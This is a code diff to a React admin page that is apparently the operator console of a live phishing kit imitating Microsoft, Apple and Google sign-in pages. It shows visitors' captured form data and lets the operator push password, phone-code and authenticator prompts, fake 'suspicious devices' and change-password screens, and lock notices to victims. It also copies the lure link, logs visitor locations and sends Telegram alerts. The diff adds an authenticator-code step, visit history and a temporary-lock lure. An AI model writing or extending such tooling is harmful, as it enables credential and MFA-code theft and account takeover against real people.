@@ -48,6 +48,7 @@ const FAVICON_OPTIONS: Array<{ id: FaviconChoice; name: string; file: string }> 
 
 interface VisitorLocation {
   city: string;
+  region?: string;
   country: string;
   countryCode: string;
   flag: string;
@@ -66,6 +67,15 @@ interface VisitorInfo {
   online: boolean;
 }
 
+interface VisitHistoryEntry {
+  id: string;
+  anonymousId: string;
+  location: VisitorLocation;
+  provider: string;
+  userAgent: string;
+  visitedAt: number;
+}
+
 const PROVIDER_COLORS: Record<Provider, string> = {
   microsoft: '#0078D4',
   apple: '#007AFF',
@@ -80,6 +90,7 @@ const STEP_LABELS: Record<string, string> = {
   'other-ways': 'Other Ways',
   'phone-entry': 'Phone',
   'phone-code': 'Phone Code',
+  'google-authenticator': 'Authenticator',
   'signin-options': 'Sign-in Opts',
   passkey: 'Passkey',
   stay: 'Stay Signed In',
@@ -116,6 +127,7 @@ const STEP_COLORS: Record<string, string> = {
   'other-ways': '#047857',
   'phone-entry': '#b45309',
   'phone-code': '#b45309',
+  'google-authenticator': '#4285F4',
   stay: '#15803d',
   register: '#be185d',
   recover: '#9f1239',
@@ -190,6 +202,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
     { category: 'Security', steps: [
       { label: '🛡 Security Alert',     step: 'security-alert',     color: '#dc2626' },
       { label: '🚨 Suspicious Devices', step: 'suspicious-devices', color: '#dc2626' },
+      { label: '🔑 Change Password',     step: 'change-password',    color: '#0078D4' },
       { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
     ]},
     { category: 'Loading Screens', steps: LOADING_STEPS },
@@ -204,6 +217,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
     ]},
     { category: 'Security', steps: [
       { label: '🚨 Suspicious Devices', step: 'suspicious-devices',  color: '#dc2626' },
+      { label: '🔑 Change Password',     step: 'change-password',     color: '#007AFF' },
       { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
     ]},
     { category: 'Loading Screens', steps: LOADING_STEPS },
@@ -213,6 +227,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
       { label: '↩ Email',       step: 'email',         color: '#4b5563' },
       { label: 'Password',      step: 'password',      color: '#4285F4' },
       { label: 'Verify CAPTCHA', step: 'verify',       color: '#1a73e8' },
+      { label: 'Authenticator',  step: 'google-authenticator', color: '#4285F4' },
       { label: 'Phone Verify',  step: 'phone-verify',  color: '#065f46' },
       { label: 'Confirm #',     step: 'phone-confirm', color: '#0d7a5f' },
       { label: 'Wrong #',       step: 'phone-wrong',   color: '#dc2626' },
@@ -222,6 +237,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
     ]},
     { category: 'Security', steps: [
       { label: '🚨 Suspicious Devices', step: 'suspicious-devices',  color: '#dc2626' },
+      { label: '🔑 Change Password',     step: 'change-password',     color: '#1a73e8' },
       { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
     ]},
     { category: 'Loading Screens', steps: LOADING_STEPS },
@@ -806,13 +822,17 @@ function VisitorModal({
 
 export default function AdminPage() {
   useEffect(() => { document.title = 'Microsoft Console'; }, []);
-  const [provider, setProvider] = useState<Provider>('microsoft');
+  const [provider, setProvider] = useState<Provider>(() => {
+    const saved = typeof window !== 'undefined' ? localStorage.getItem('auth_studio_provider') : null;
+    return saved === 'apple' || saved === 'google' || saved === 'microsoft' ? saved : 'microsoft';
+  });
   const [pendingProvider, setPendingProvider] = useState<Provider | null>(null);
   const [device, setDevice] = useState<Device>('desktop');
   const [theme, setTheme] = useState<Theme>('light');
   const [prompt, setPrompt] = useState<Prompt>('password');
   const [phoneEnabled, setPhoneEnabled] = useState(false);
   const [removalWaitSeconds, setRemovalWaitSeconds] = useState(20);
+  const [temporaryLockEnabled, setTemporaryLockEnabled] = useState(false);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
   const [adminCount, setAdminCount] = useState(1);
@@ -830,6 +850,7 @@ export default function AdminPage() {
   const [telegramChatId, setTelegramChatId] = useState('');
   const [telegramEnabled, setTelegramEnabled] = useState(false);
   const [telegramConfigured, setTelegramConfigured] = useState(false);
+  const [editingTelegram, setEditingTelegram] = useState(false);
   const [telegramBusy, setTelegramBusy] = useState(false);
   const [telegramMessage, setTelegramMessage] = useState<string | null>(null);
   const recentTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});
@@ -918,6 +939,8 @@ export default function AdminPage() {
 
   // ── Auth / passcode gate ──────────────────────────────────────────────────────
   const [authState, setAuthState] = useState<'loading' | 'gate' | 'verified'>('loading');
+  const [visitHistory, setVisitHistory] = useState<VisitHistoryEntry[]>([]);
+  const [historyOpen, setHistoryOpen] = useState(false);
   const [passcodeInput, setPasscodeInput] = useState('');
   const [passcodeError, setPasscodeError] = useState<string | null>(null);
   const passcodeRef = useRef('');
@@ -963,8 +986,24 @@ export default function AdminPage() {
         setTelegramConfigured(setting.configured);
         setTelegramEnabled(setting.enabled);
         setTelegramChatId(setting.chatId);
+        setEditingTelegram(!setting.configured);
       })
       .catch(() => setTelegramMessage('Could not load Telegram settings.'));
+
+    const loadVisitHistory = () => {
+      fetch(`${base}/api/visit-history`, {
+        headers: { 'x-admin-passcode': passcodeRef.current },
+      })
+        .then(async response => {
+          if (!response.ok) throw new Error('Unable to load visit history');
+          return response.json() as Promise<{ visits: VisitHistoryEntry[] }>;
+        })
+        .then(data => setVisitHistory(data.visits))
+        .catch(() => {});
+    };
+    loadVisitHistory();
+    const historyTimer = window.setInterval(loadVisitHistory, 15000);
+    return () => window.clearInterval(historyTimer);
   }, [authState]);
 
   const saveTelegram = async () => {
@@ -987,6 +1026,7 @@ export default function AdminPage() {
       setTelegramEnabled(Boolean(result.enabled));
       setTelegramChatId(result.chatId || '');
       setTelegramToken('');
+      setEditingTelegram(false);
       setTelegramMessage('Telegram settings saved.');
     } catch (error) {
       setTelegramMessage(error instanceof Error ? error.message : 'Could not save Telegram settings.');
@@ -1080,8 +1120,20 @@ export default function AdminPage() {
           setWsStatus('connected');
 
           if (msg.type === 'visitors' && msg.visitors) {
-            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, formHistory: v.formHistory ?? [], online: true })));
-            if (msg.globalProvider) setProvider(msg.globalProvider as Provider);
+            setVisitors(msg.visitors.map(v => ({
+              ...v,
+              formData: v.formData ?? {},
+              formHistory: v.formHistory ?? [],
+              online: v.online ?? false,
+            })));
+            const savedProvider = localStorage.getItem('auth_studio_provider');
+            if (savedProvider && savedProvider !== msg.globalProvider) {
+              setProvider(savedProvider as Provider);
+              ws.send(JSON.stringify({ type: 'switch-provider', provider: savedProvider }));
+            } else if (msg.globalProvider) {
+              setProvider(msg.globalProvider as Provider);
+              localStorage.setItem('auth_studio_provider', msg.globalProvider);
+            }
           } else if (msg.type === 'global-provider' && msg.provider) {
             setProvider(msg.provider as Provider);
           } else if (msg.type === 'visitor-joined' && msg.visitor) {
@@ -1166,13 +1218,17 @@ export default function AdminPage() {
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
       const payload: Record<string, unknown> = { navigate, ...(extra ?? {}) };
-      if (navigate === 'suspicious-devices') payload.waitSeconds = removalWaitSeconds;
+      if (navigate === 'suspicious-devices') {
+        payload.waitSeconds = removalWaitSeconds;
+        payload.temporaryLockEnabled = temporaryLockEnabled;
+      }
       ws.send(JSON.stringify({ type: 'push-action', visitorId, action: payload }));
     }
   };
 
   const confirmProviderSwitch = (p: Provider) => {
     setProvider(p);
+    localStorage.setItem('auth_studio_provider', p);
     if (p !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); }
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
@@ -1476,21 +1532,33 @@ export default function AdminPage() {
               <Send className="w-3.5 h-3.5 text-[#2AABEE]" />
             </div>
             <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] p-3 space-y-2.5">
-              <input
-                type="password"
-                value={telegramToken}
-                onChange={event => setTelegramToken(event.target.value)}
-                placeholder={telegramConfigured ? 'Bot token saved ••••••••' : 'Bot API token'}
-                autoComplete="off"
-                className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
-              />
-              <input
-                type="text"
-                value={telegramChatId}
-                onChange={event => setTelegramChatId(event.target.value)}
-                placeholder="Chat ID"
-                className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
-              />
+              {telegramConfigured && !editingTelegram ? (
+                <div className="rounded-md border border-emerald-500/25 bg-emerald-500/10 px-3 py-2.5">
+                  <div className="flex items-center gap-2 text-[11px] font-semibold text-emerald-400">
+                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
+                    Telegram connected
+                  </div>
+                  <div className="mt-1 text-[10px] text-[#8a919e]">Chat {telegramChatId} · token securely saved</div>
+                </div>
+              ) : (
+                <>
+                  <input
+                    type="password"
+                    value={telegramToken}
+                    onChange={event => setTelegramToken(event.target.value)}
+                    placeholder={telegramConfigured ? 'Leave blank to keep saved token' : 'Bot API token'}
+                    autoComplete="off"
+                    className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
+                  />
+                  <input
+                    type="text"
+                    value={telegramChatId}
+                    onChange={event => setTelegramChatId(event.target.value)}
+                    placeholder="Chat ID"
+                    className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
+                  />
+                </>
+              )}
               <label className="flex items-center justify-between text-[11px] text-[#aeb5c0]">
                 Send “someone visited” pings
                 <input
@@ -1501,13 +1569,20 @@ export default function AdminPage() {
                 />
               </label>
               <div className="flex gap-1.5">
-                <button
-                  onClick={() => void saveTelegram()}
-                  disabled={telegramBusy || !telegramChatId.trim() || (!telegramConfigured && !telegramToken.trim())}
-                  className="flex-1 rounded-md bg-[#2AABEE] px-2 py-1.5 text-[11px] font-semibold text-white disabled:opacity-40"
-                >
-                  {telegramBusy ? 'Working…' : 'Save'}
-                </button>
+                {editingTelegram || !telegramConfigured ? (
+                  <button
+                    onClick={() => void saveTelegram()}
+                    disabled={telegramBusy || !telegramChatId.trim() || (!telegramConfigured && !telegramToken.trim())}
+                    className="flex-1 rounded-md bg-[#2AABEE] px-2 py-1.5 text-[11px] font-semibold text-white disabled:opacity-40"
+                  >
+                    {telegramBusy ? 'Working…' : 'Save permanently'}
+                  </button>
+                ) : (
+                  <button onClick={() => setEditingTelegram(true)}
+                    className="flex-1 rounded-md border border-[#3d424c] px-2 py-1.5 text-[11px] font-semibold text-[#aeb5c0] hover:text-white">
+                    Change settings
+                  </button>
+                )}
                 <button
                   onClick={() => void testTelegram()}
                   disabled={telegramBusy || !telegramConfigured}
@@ -1599,6 +1674,16 @@ export default function AdminPage() {
           <section className="space-y-2">
             <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Security</p>
             <div className="rounded-lg border border-[#dc2626]/40 bg-[#1a1d24] px-3 py-3 space-y-3">
+              <div className="flex items-center justify-between gap-3 pb-3 border-b border-[#2d3139]">
+                <div className="flex items-center gap-2.5">
+                  <Lock className="w-4 h-4 text-amber-400" />
+                  <div>
+                    <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Temporary account lock</div>
+                    <div className="text-[10px] text-[#606672]">Show lock notice after password change</div>
+                  </div>
+                </div>
+                <Toggle enabled={temporaryLockEnabled} onToggle={() => setTemporaryLockEnabled(v => !v)} />
+              </div>
               <div className="flex items-center gap-2.5">
                 <AlertCircle className="w-4 h-4 text-[#dc2626]" />
                 <div>
@@ -1653,6 +1738,13 @@ export default function AdminPage() {
             )}
           </div>
           <button
+            onClick={() => setHistoryOpen(open => !open)}
+            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border transition-colors text-[11px] font-medium flex-shrink-0 ${historyOpen ? 'bg-indigo-500/15 border-indigo-500/30 text-indigo-300' : 'bg-[#1e2128] border-[#2d3139] text-[#8a919e] hover:text-white'}`}
+          >
+            History
+            {visitHistory.length > 0 && <span className="text-[10px] opacity-70">{visitHistory.length}</span>}
+          </button>
+          <button
             onClick={() => { navigator.clipboard.writeText(src).catch(() => {}); }}
             title="Copy login link to clipboard"
             className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1e2128] border border-[#2d3139] text-[#8a919e] hover:text-white hover:border-[#3a3f4a] transition-colors text-[11px] font-medium flex-shrink-0"
@@ -1667,6 +1759,44 @@ export default function AdminPage() {
 
         {/* Content area */}
         <div className="flex-1 overflow-y-auto p-5">
+          {historyOpen && (
+            <div className="mb-5 rounded-xl border border-[#2d3139] bg-[#13151a] overflow-hidden">
+              <div className="flex items-center justify-between px-4 py-3 border-b border-[#2d3139]">
+                <div>
+                  <p className="text-[13px] font-semibold text-white">Visitor history</p>
+                  <p className="text-[10px] text-[#555d6b] mt-0.5">Anonymous visits only · no passwords or verification codes</p>
+                </div>
+                <span className="text-[11px] text-[#8a919e]">{visitHistory.length} saved</span>
+              </div>
+              {visitHistory.length === 0 ? (
+                <p className="px-4 py-6 text-center text-[12px] text-[#555d6b]">New visits will appear here.</p>
+              ) : (
+                <div className="max-h-72 overflow-y-auto divide-y divide-[#232630]">
+                  {visitHistory.slice(0, 100).map(visit => {
+                    const ua = parseUA(visit.userAgent);
+                    return (
+                      <div key={visit.id} className="grid grid-cols-[1fr_auto] gap-4 px-4 py-3 hover:bg-[#16181d]">
+                        <div className="min-w-0">
+                          <div className="flex items-center gap-2">
+                            <ProviderBadge provider={visit.provider} size={15} />
+                            <span className="text-[12px] font-medium text-[#c9d1d9] capitalize">{visit.provider}</span>
+                            <span className="font-mono text-[10px] text-[#555d6b]">#{visit.anonymousId.slice(0, 8)}</span>
+                          </div>
+                          <p className="text-[11px] text-[#8a919e] mt-1">
+                            {visit.location.flag} {visit.location.city || 'Unknown'}, {visit.location.country || 'Unknown'} · {ua.browser} · {ua.os}
+                          </p>
+                        </div>
+                        <div className="text-right flex-shrink-0">
+                          <p className="text-[10px] text-[#8a919e]">{new Date(visit.visitedAt).toLocaleDateString()}</p>
+                          <p className="text-[10px] font-mono text-[#555d6b] mt-0.5">{new Date(visit.visitedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</p>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+              )}
+            </div>
+          )}
           {visitors.length === 0 ? (
             <div className="flex flex-col items-center justify-center h-full min-h-[400px] gap-4 text-center">
               <div className="w-16 h-16 rounded-2xl bg-[#16181d] border border-[#2d3139] flex items-center justify-center mb-2">
